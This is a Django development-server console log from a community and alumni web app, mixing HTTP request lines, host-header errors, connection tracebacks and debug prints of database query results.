[10/Dec/2018 07:14:02] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[10/Dec/2018 07:14:03] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Not Found: /logo.jpeg
[10/Dec/2018 08:50:26] "GET /logo.jpeg HTTP/1.1" 404 5958
[10/Dec/2018 08:55:21] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 08:55:22] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[10/Dec/2018 08:55:22] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 08:55:22] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[10/Dec/2018 08:55:23] "GET /community/4/ HTTP/1.1" 200 10341
[10/Dec/2018 08:55:24] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[10/Dec/2018 08:55:24] "GET /media/media/logo.png HTTP/1.1" 304 0
Not Found: /community/4/logo.jpeg
[10/Dec/2018 08:55:25] "GET /community/4/logo.jpeg HTTP/1.1" 404 5994
[10/Dec/2018 08:55:32] "GET /requests HTTP/1.1" 200 5536
[10/Dec/2018 08:55:32] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 08:55:34] "GET /login/ HTTP/1.1" 302 0
[10/Dec/2018 08:55:35] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 08:55:36] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[10/Dec/2018 08:55:36] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 08:55:37] "GET /profile/4 HTTP/1.1" 200 22463
[10/Dec/2018 08:55:38] "GET /media/media/logo.png HTTP/1.1" 304 0
Not Found: /profile/logo.jpeg
[10/Dec/2018 08:55:39] "GET /profile/logo.jpeg HTTP/1.1" 404 5982
[10/Dec/2018 08:55:55] "GET /login/ HTTP/1.1" 302 0
[10/Dec/2018 08:55:56] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 08:55:57] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[10/Dec/2018 08:55:57] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 08:56:00] "GET /profile/4 HTTP/1.1" 200 22463
[10/Dec/2018 08:56:00] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 08:56:00] "GET /media/media/logo.png HTTP/1.1" 200 11255
[10/Dec/2018 08:56:04] "GET /login/ HTTP/1.1" 302 0
[10/Dec/2018 08:56:05] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 08:56:05] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 10:10:21] "GET / HTTP/1.1" 400 62405
Not Found: /logo.jpeg
[10/Dec/2018 10:18:30] "GET /logo.jpeg HTTP/1.1" 404 5958
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 10:18:57] "GET / HTTP/1.1" 400 62405
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 10:43:05] "GET / HTTP/1.1" 400 62407
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 11:38:20] "GET / HTTP/1.0" 400 62418
----------------------------------------
Exception happened during processing of request from ('61.219.11.151', 64199)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 647, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 139, in handle
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.7/socket.py", line 589, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 12:31:29] "GET / HTTP/1.1" 400 62408
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 13:15:50] "GET / HTTP/1.1" 400 62379
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[10/Dec/2018 13:15:50] "GET / HTTP/1.1" 500 59
----------------------------------------
Exception happened during processing of request from ('101.201.235.107', 57036)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
    super().handle_error()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 647, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
    handler.run(self.server.get_app())
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/usr/lib64/python3.7/wsgiref/simple_server.py", line 35, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
----------------------------------------
[10/Dec/2018 13:28:20] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 13:28:20] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 13:28:20] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[10/Dec/2018 13:28:21] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[10/Dec/2018 13:28:37] "GET /community/4 HTTP/1.1" 301 0
Performing system checks...

System check identified no issues (0 silenced).
December 09, 2018 - 16:34:47
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Alumni', '_': '1544373289442'}
<QuerySet [<Category: Category object (3)>]>
comm : [{'id': 3, 'name': 'test_community_1', 'about': 'about', 'image_url': '/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg', 'location': 'Roorkee, Uttrakhand, India', 'members_count': 2}]
{}
: [<Community: test_community_1>]
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>]
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Alumni', '_': '1544374440162'}
<QuerySet [<Category: Category object (3)>]>
comm : [{'id': 3, 'name': 'test_community_1', 'about': 'about', 'image_url': '/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg', 'location': 'Roorkee, Uttrakhand, India', 'members_count': 2}]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Alumni', '_': '1544374694135'}
<QuerySet [<Category: Category object (3)>]>
comm : [{'id': 3, 'name': 'test_community_1', 'about': 'about', 'image_url': '/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg', 'location': 'Roorkee, Uttrakhand, India', 'members_count': 2}]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
<QuerySet []>
[]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Alumni', '_': '1544404679735'}
<QuerySet [<Category: Category object (3)>]>
comm : [{'id': 3, 'name': 'test_community_1', 'about': 'about', 'image_url': '/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg', 'location': 'Roorkee, Uttrakhand, India', 'members_count': 2}]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
4
data: <QuerySet [<Form_data: Form_data object (6)>, <Form_data: Form_data object (5)>, <Form_data: Form_data object (4)>]>
4
{'csrfmiddlewaretoken': 'CAuvVFMZ2DTVT8ipgAw0X0viZIqh7LPbpWAH8rJXYqXx4FzxVIc9f1B6mpmlujtc', 'Name': 'Collabmates', 'Contact': '9891814325', 'College': 'IIT delhi'}
Name
Contact
College
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>]
{}
: [<Community: test_community_1>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
here
None
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>]
here
None
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
{}
: [<Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: IIT Delhi Entrepreneurs in Gurgaon>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
{}
<QuerySet []>
[]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>][10/Dec/2018 13:28:37] "GET /community/4/ HTTP/1.1" 200 10341
[10/Dec/2018 13:29:08] "GET /community/4/ HTTP/1.1" 200 10341
[10/Dec/2018 13:29:12] "GET /login/ HTTP/1.1" 302 0
[10/Dec/2018 13:29:12] "GET / HTTP/1.1" 200 13663
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 13:31:13] "GET / HTTP/1.1" 400 62414
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 13:49:00] "GET / HTTP/1.1" 400 62528
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 13:49:16] "GET / HTTP/1.1" 400 62413
[10/Dec/2018 14:12:24] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_DvPt80B.jpg HTTP/1.1" 304 0
[10/Dec/2018 14:12:24] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_zLD6F9Z.jpg HTTP/1.1" 304 0
[10/Dec/2018 14:12:25] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_sOvU3Fz.jpg HTTP/1.1" 304 0
[10/Dec/2018 14:12:26] "GET /media/media/ACDC-Wallpaper-For-Desktop.jpg HTTP/1.1" 304 0
[10/Dec/2018 14:12:26] "GET /media/media/Screen_Shot_2018-12-03_at_3.56.49_PM.png HTTP/1.1" 304 0
[10/Dec/2018 14:12:26] "GET /media/media/Pink-Floyd-Back-Catalogue-music-1.jpg HTTP/1.1" 304 0
[10/Dec/2018 14:12:26] "GET /media/media/Screen_Shot_2018-11-22_at_12.43.59_AM.png HTTP/1.1" 304 0
[10/Dec/2018 14:12:27] "GET /media/media/40af0d468633a4ee2f2344e6021f056b.jpg HTTP/1.1" 304 0
[10/Dec/2018 14:12:27] "GET /media/media/abstract-access-close-up-1089438_fJciEGK.jpg HTTP/1.1" 304 0
[10/Dec/2018 14:12:27] "GET /media/media/jimmy-page-led-zeppelin-wallpaper.jpg HTTP/1.1" 304 0
[10/Dec/2018 14:12:28] "GET /media/media/23283091_511838242502259_654899688_n.png HTTP/1.1" 304 0
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[10/Dec/2018 14:12:28] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
[10/Dec/2018 14:12:29] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_eaOXxUw.jpg HTTP/1.1" 304 0
[10/Dec/2018 14:12:30] "GET /media/media/abstract-access-close-up-1089438.jpg HTTP/1.1" 304 0
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[10/Dec/2018 14:12:30] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[10/Dec/2018 14:12:30] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
[10/Dec/2018 14:12:30] "GET /media/media/brasspanchmukhinaag-500x500.png HTTP/1.1" 200 454350
[10/Dec/2018 14:12:31] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_eaOXxUw.jpg HTTP/1.1" 200 102923
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[10/Dec/2018 14:12:32] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
[10/Dec/2018 14:12:32] "GET /media/media/abstract-access-close-up-1089438.jpg HTTP/1.1" 200 1531904
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[10/Dec/2018 14:12:37] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[10/Dec/2018 14:12:38] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
[10/Dec/2018 14:12:44] "GET /media/media/abstract-access-close-up-1089438.jpg HTTP/1.1" 200 712704
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[10/Dec/2018 14:12:44] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[10/Dec/2018 14:12:44] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[10/Dec/2018 14:12:46] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
[10/Dec/2018 14:12:46] "GET /media/media/abstract-access-close-up-1089438.jpg HTTP/1.1" 200 581632
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[10/Dec/2018 14:12:47] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
[10/Dec/2018 14:12:49] "GET /media/media/abstract-access-close-up-1089438.jpg HTTP/1.1" 200 647168
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[10/Dec/2018 14:12:49] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[10/Dec/2018 14:12:51] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
[10/Dec/2018 14:12:52] "GET /media/media/brasspanchmukhinaag-500x500.png HTTP/1.1" 304 0
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[10/Dec/2018 14:17:00] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[10/Dec/2018 14:17:00] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[10/Dec/2018 14:17:03] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[10/Dec/2018 14:17:03] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
[10/Dec/2018 14:17:03] "GET /media/media/abstract-access-close-up-1089438.jpg HTTP/1.1" 200 81920
[10/Dec/2018 14:17:04] "GET /media/media/abstract-access-close-up-1089438.jpg HTTP/1.1" 200 196608
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[10/Dec/2018 14:18:50] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[10/Dec/2018 14:18:50] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
[10/Dec/2018 14:29:56] "GET /media/media/abstract-access-close-up-1089438.jpg HTTP/1.1" 200 245760
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
TimeoutError: [Errno 110] Connection timed out
[10/Dec/2018 14:29:56] "GET /media/media/abstract-access-close-up-1089438.jpg HTTP/1.1" 500 59
----------------------------------------
Exception happened during processing of request from ('103.37.200.253', 56345)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
TimeoutError: [Errno 110] Connection timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
    super().handle_error()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 647, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
    handler.run(self.server.get_app())
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/usr/lib64/python3.7/wsgiref/simple_server.py", line 35, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
----------------------------------------
[10/Dec/2018 14:35:03] "GET /media/media/abstract-access-close-up-1089438.jpg HTTP/1.1" 200 1630208
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
TimeoutError: [Errno 110] Connection timed out
[10/Dec/2018 14:35:03] "GET /media/media/abstract-access-close-up-1089438.jpg HTTP/1.1" 500 59
----------------------------------------
Exception happened during processing of request from ('103.37.200.253', 58032)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
TimeoutError: [Errno 110] Connection timed out

